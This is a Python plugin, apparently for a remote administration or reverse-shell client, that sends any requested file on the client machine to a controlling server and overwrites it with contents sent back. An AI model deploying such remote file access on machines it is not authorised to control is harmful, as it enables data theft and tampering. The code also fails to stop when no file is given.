import shlex
from os.path import realpath


class Plugin(object):
    version = 'v1.0'
    invocation = '# '
    enabled = True

    @staticmethod
    def run(client, data):
        args = shlex.split(data)

        if not args:
            client.server_print('Did not specify a file to edit.')

        # Get the filepath and open the file.
        # if there is no file, then set the
        # file data to an empty string so
        # a new empty file is created.
        filepath = realpath(args[0])
        try:
            with open(filepath, 'r') as f:
                file_data = f.read()
        except Exception:
            file_data = ''

        # Tell the server that the file was read correctly.
        client.send_data('OK')

        # Send the filename
        filename = filepath.split('/')[-1] if '/' in filepath else filepath.split('\\')[-1]
        client.send_data(filename)

        # Send the original file data.
        client.send_data(file_data, encode=True)

        # Receive the new file data.
        new_file_data = client.receive_data()

        # Write the new file data to a file.
        with open(filepath, 'w') as f:
            f.write(new_file_data)

        # Tell the server the new file data has been written.
        client.send_data('OK')
        return
